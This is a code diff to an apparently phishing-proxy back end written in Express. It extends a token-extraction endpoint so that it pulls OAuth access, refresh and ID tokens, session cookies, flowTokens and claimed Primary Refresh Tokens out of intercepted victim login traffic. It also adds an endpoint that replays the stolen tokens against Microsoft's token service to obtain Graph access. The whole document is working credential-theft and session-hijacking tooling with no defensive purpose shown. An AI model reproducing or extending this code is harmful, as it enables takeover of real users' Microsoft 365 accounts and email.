@@ -217,7 +217,7 @@ app.get('/api/replay/:filename', (req, res) => {
 });
 
 // =============================================
-// 🔑 TOKEN EXTRACTION API
+// 🔑 TOKEN EXTRACTION API (with PRT support)
 // =============================================
 app.get('/api/tokens/:filename', (req, res) => {
     const filePath = path.join(LOG_DIR, req.params.filename);
@@ -231,7 +231,10 @@ app.get('/api/tokens/:filename', (req, res) => {
             refresh_tokens: [],
             id_tokens: [],
             cookies: [],
-            sessions: []
+            sessions: [],
+            prt: null,          // ✅ Primary Refresh Token
+            flowToken: null,    // ✅ Flow Token (often contains PRT)
+            originalRequest: null // ✅ Original request (may contain PRT)
         };
 
         for (const line of lines) {
@@ -245,6 +248,8 @@ app.get('/api/tokens/:filename', (req, res) => {
                 const body = obj.proxyRequestBody;
                 if (body) {
                     const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+                    
+                    // Standard OAuth tokens
                     const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
                     const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                     const idMatch = bodyStr.match(/id_token=([^&]+)/i);
@@ -252,26 +257,47 @@ app.get('/api/tokens/:filename', (req, res) => {
                     if (refreshMatch) tokens.refresh_tokens.push(decodeURIComponent(refreshMatch[1]));
                     if (idMatch) tokens.id_tokens.push(decodeURIComponent(idMatch[1]));
 
+                    // ✅ PRT Extraction - Look for Primary Refresh Token
+                    const prtMatch = bodyStr.match(/primaryRefreshToken[=:]+([^&"',}]+)/i);
+                    const flowTokenMatch = bodyStr.match(/flowToken[=:]+([^&"',}]+)/i);
+                    const originalRequestMatch = bodyStr.match(/originalRequest[=:]+([^&"',}]+)/i);
+                    if (prtMatch) tokens.prt = decodeURIComponent(prtMatch[1]);
+                    if (flowTokenMatch) tokens.flowToken = decodeURIComponent(flowTokenMatch[1]);
+                    if (originalRequestMatch) tokens.originalRequest = decodeURIComponent(originalRequestMatch[1]);
+
+                    // Also look for PRT in JSON objects
                     try {
                         const json = typeof body === 'string' ? JSON.parse(body) : body;
                         if (json.access_token) tokens.access_tokens.push(json.access_token);
                         if (json.refresh_token) tokens.refresh_tokens.push(json.refresh_token);
                         if (json.id_token) tokens.id_tokens.push(json.id_token);
+                        if (json.primaryRefreshToken) tokens.prt = json.primaryRefreshToken;
+                        if (json.flowToken) tokens.flowToken = json.flowToken;
                     } catch (e) {}
                 }
 
+                // Also check cookies for PRT (esctx contains encrypted PRT)
                 const setCookie = obj.proxyResponseHeaders?.['set-cookie'];
                 if (setCookie) {
                     const cookieArray = Array.isArray(setCookie) ? setCookie : [setCookie];
                     for (const cookie of cookieArray) {
                         const [nameValue] = cookie.split(';');
                         if (nameValue) tokens.cookies.push(nameValue.trim());
+                        // esctx cookie often contains the PRT
+                        if (nameValue && nameValue.toLowerCase().includes('esctx')) {
+                            tokens.prt = tokens.prt || nameValue.split('=')[1];
+                        }
                     }
                 }
 
                 const sessionCookie = obj.proxyRequestHeaders?.cookie;
                 if (sessionCookie) {
                     tokens.sessions.push(sessionCookie);
+                    // Extract esctx from cookie header
+                    const esctxMatch = sessionCookie.match(/esctx=([^;]+)/);
+                    if (esctxMatch) {
+                        tokens.prt = tokens.prt || esctxMatch[1];
+                    }
                 }
             } catch (e) {}
         }
@@ -288,7 +314,7 @@ app.get('/api/tokens/:filename', (req, res) => {
 });
 
 // =============================================
-// 🔄 TOKEN EXCHANGE API
+// 🔄 TOKEN EXCHANGE API (Refresh Token)
 // =============================================
 app.post('/api/exchange', async (req, res) => {
     const { refresh_token } = req.body;
@@ -307,6 +333,56 @@ app.post('/api/exchange', async (req, res) => {
             { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
         );
         res.json(response.data);
+    } catch (err) {
+        res.status(500).json({ 
+            error: err.response?.data?.error_description || err.message 
+        });
+    }
+});
+
+// =============================================
+// 🔄 PRT EXCHANGE API (Primary Refresh Token)
+// =============================================
+app.post('/api/prt/exchange', async (req, res) => {
+    const { prt, refresh_token } = req.body;
+    if (!prt && !refresh_token) {
+        return res.status(400).json({ error: 'PRT or refresh token required' });
+    }
+
+    try {
+        const axios = require('axios');
+        
+        // Try to exchange the token for a new access token
+        const tokenData = {
+            client_id: '3ce82761-cb43-493f-94bb-fe444b7a0cc4',
+            grant_type: 'refresh_token',
+            scope: 'https://graph.microsoft.com/.default offline_access'
+        };
+        
+        // Use refresh_token if provided, otherwise use PRT
+        if (refresh_token) {
+            tokenData.refresh_token = refresh_token;
+        } else if (prt) {
+            tokenData.refresh_token = prt;
+        }
+        
+        const response = await axios.post(
+            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
+            new URLSearchParams(tokenData),
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+        );
+        
+        // Store the PRT information
+        const prtInfo = {
+            access_token: response.data.access_token,
+            refresh_token: response.data.refresh_token,
+            id_token: response.data.id_token,
+            expires_in: response.data.expires_in,
+            token_type: response.data.token_type,
+            extracted_at: new Date().toISOString()
+        };
+        
+        res.json({ success: true, ...prtInfo });
     } catch (err) {
         res.status(500).json({ 
             error: err.response?.data?.error_description || err.message 
@@ -484,7 +560,7 @@ app.post('/api/webmail/search', async (req, res) => {
 });
 
 // =============================================
-// 📊 VISITS API ENDPOINTS (NEW)
+// 📊 VISITS API ENDPOINTS
 // =============================================
 
 // ---------- API: Get visits ----------
@@ -514,7 +590,7 @@ app.get('/api/visits', (req, res) => {
         const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
         
         res.json({
-            visits: visits.slice(0, 100), // Last 100 visits
+            visits: visits.slice(0, 100),
             total: visits.length,
             uniqueIPs: uniqueIPs,
             today: todayVisits.length,
